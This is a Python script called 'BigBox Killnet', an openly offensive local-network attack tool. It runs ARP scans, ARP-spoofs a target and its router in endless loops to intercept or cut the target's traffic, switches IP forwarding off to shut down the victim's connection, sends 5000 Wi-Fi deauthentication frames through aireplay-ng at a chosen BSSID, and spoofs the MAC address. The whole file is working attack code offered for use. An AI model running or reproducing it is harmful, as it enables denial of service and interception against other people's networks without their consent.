import scapy.all as scapy
import optparse
import time
import subprocess
import re
import pyfiglet
import sys
ascii_banner = pyfiglet.figlet_format("BigBox Killnet")
print(ascii_banner)

def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-I","--IP_range", dest="IP_range",help="Enter the IP range to find target (Ex: 192.168.1.0/24): ")
    parse_object.add_option("-t","--target_IP", dest="Target_IP",help="Enter the IP of the target: ")
    parse_object.add_option("-m","--target_MAC", dest="Target_MAC",help="Enter the MAC of the target: ")
    parse_object.add_option("-r","--router_IP", dest="Router_IP",help="Enter the IP of the router: ")
    parse_object.add_option("-M","--router_MAC", dest="Router_MAC",help="Enter the MAC of the router: ")
    parse_object.add_option("-s","--ON_OFF", dest="ON_OFF",help="ON/OFF (1 or 0) target's network: ")
    parse_object.add_option("-i","--interface",dest="interface",help="Enter the interface: ")
    parse_object.add_option("-a","--mac",dest="mac_address",help="Enter new mac address: ")
    parse_object.add_option("-R","--ready",dest="ready_for_overkill",help="Enter the time to search for target (second): ")
    parse_object.add_option("-O","--overkill",dest="Overkill",help="Enter the target's BSSID: ")
    return parse_object.parse_args()

(User_input,arg)=get_user_input()

IP_RANGE = User_input.IP_range
TARGET_IP = User_input.Target_IP
TARGET_MAC = User_input.Target_MAC
ROUTER_IP = User_input.Router_IP
ROUTER_MAC = User_input.Router_MAC
KILLMODE = User_input.ON_OFF
INTERFACE = User_input.interface
MAC = User_input.mac_address
READY_FOR_OVERKILL = User_input.ready_for_overkill
OVERKILL = User_input.Overkill

def Ready_for_Overkill(time_to_kill):
    print(f"\n>>> Remember! Check the wlan0 interface\n")
    time.sleep(3)
    print(f">>> Checking for wlan0 interface\n")
    
    ifconfig = subprocess.check_output(["ifconfig"])
    check_wlan0 = re.search(r'wlan0:',str(ifconfig))
    re_check_wlan0mon = re.search(r'wlan0mon:',str(ifconfig))
    if check_wlan0:
        good =  check_wlan0.group(0)
        print(f">>> Noice! wlan0 is on\n")
        time.sleep(0.5)
        print(f">>> Transform wlan0 to wlan0mon\n")
        time.sleep(3)
        subprocess.call(f"airmon-ng start wlan0", shell=True)
        time.sleep(3)
        transform = subprocess.check_output(["ifconfig"])
        check_wlan0mon = re.search(r'wlan0mon:',str(transform))
        if check_wlan0mon:
                try:
                    print("\n>>> Tranform completed ! Ready for Overkill mode")
                    subprocess.call(["airodump-ng","wlan0mon"],timeout = time_to_kill)
                except subprocess.TimeoutExpired: 
                    print("\n>>> Stop hunting")
                    sys.exit(1)
                    
        else :
               return print(">>> Tranform failed ! Can't use Overkill mode")        
    elif re_check_wlan0mon:
               time.sleep(2)
               print(">>> Everything you need is already on! Ready for Overkill mode")
               try:
                    print(">>> Tranform completed ! Ready for Overkill mode")
                    subprocess.call(["airodump-ng","wlan0mon"],timeout = time_to_kill)
               except subprocess.TimeoutExpired: 
                    print("\n>>> Stop hunting")
                    sys.exit(1)
                    
    else:
        return print(f">>> Oh! Check your USB wificard or interface again please")
if READY_FOR_OVERKILL:
   ready = int(READY_FOR_OVERKILL)
   Ready_for_Overkill(ready) 
else: 
    None

def Overkill_mode(BSSID):
    transform = subprocess.check_output(["ifconfig"])
    check_wlan0mon = re.search(r'wlan0mon:',str(transform))
    if check_wlan0mon:
        try:
            print("\n>>> Starting Overkill mode\n")
            time.sleep(2)
            subprocess.call(f"aireplay-ng --deauth 5000 -a {BSSID} wlan0mon", shell=True)
        except ValueError:
            print("\n>>> That was no valid number. Please try again")
    else: 
        print("\n>>> Please start Ready for Overkill mode (-R) first") 
if OVERKILL:
   Overkill_mode(OVERKILL)
else: 
    None

def Change_mac_address(user_interface,user_mac_address):
    print("\n>>> Changing your MAC address")
    time.sleep(2)
    subprocess.call(["ifconfig",user_interface,"down"])
    subprocess.call(["ifconfig", user_interface,"hw","ether",user_mac_address])
    subprocess.call(["ifconfig",user_interface,"up"])
    print("\n>>> Checking ... ")
    time.sleep(2)
    ifconfig = subprocess.check_output(["ifconfig",INTERFACE])
    new_mac = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w",str(ifconfig))
    NEW_MAC = new_mac.group(0)
    print(f"\n>>> Your new MAC address : {NEW_MAC}")
if MAC and INTERFACE:
        Change_mac_address(INTERFACE, MAC)
else: 
    None
def Killmode():
     return subprocess.call(f"echo {KILLMODE} > /proc/sys/net/ipv4/ip_forward", shell=True)
    
if KILLMODE == "0":
    print("\n>>> Shut down target's network: ON")
    Killmode()
    time.sleep(1)
else:
    print("\n>>> Shut down target's network: OFF")    
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
    time.sleep(1)


def scan_my_network():
    try:
        arp_request_packet = scapy.ARP(pdst=f"{IP_RANGE}")
        broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        Fusion = broadcast_packet/arp_request_packet
        (answered_list,unanswered_list) = scapy.srp(Fusion,timeout=10)
        answered_list.summary()
    except subprocess.TimeoutExpired: 
        print("\n>>> Stop hunting")
        sys.exit(1)

if IP_RANGE:
    scan_my_network()
else:
    None  

def spoof_target(): 
   arp_response= scapy.ARP(op = 2, pdst = f'{TARGET_IP}',hwdst = f'{TARGET_MAC}', psrc = f'{ROUTER_IP}')
   while True:    
     scapy.send(arp_response)

def spoof_router(): 
   arp_response= scapy.ARP(op = 2, pdst = f'{ROUTER_IP}',hwdst = f'{ROUTER_MAC}', psrc = f'{TARGET_IP}')
   while True:    
     scapy.send(arp_response)

def fullduplex():
    while True:
        spoof_target()
        spoof_router()

try: 
    while True:
        if TARGET_IP and TARGET_MAC and ROUTER_MAC:
            spoof_target()
        elif ROUTER_IP and ROUTER_MAC and TARGET_IP:
            spoof_router()  
        elif TARGET_IP and TARGET_MAC and ROUTER_MAC and ROUTER_IP:
            fullduplex()
        else:
            break
             
except ValueError:
        print(">>> That was no valid number. Please try again") 
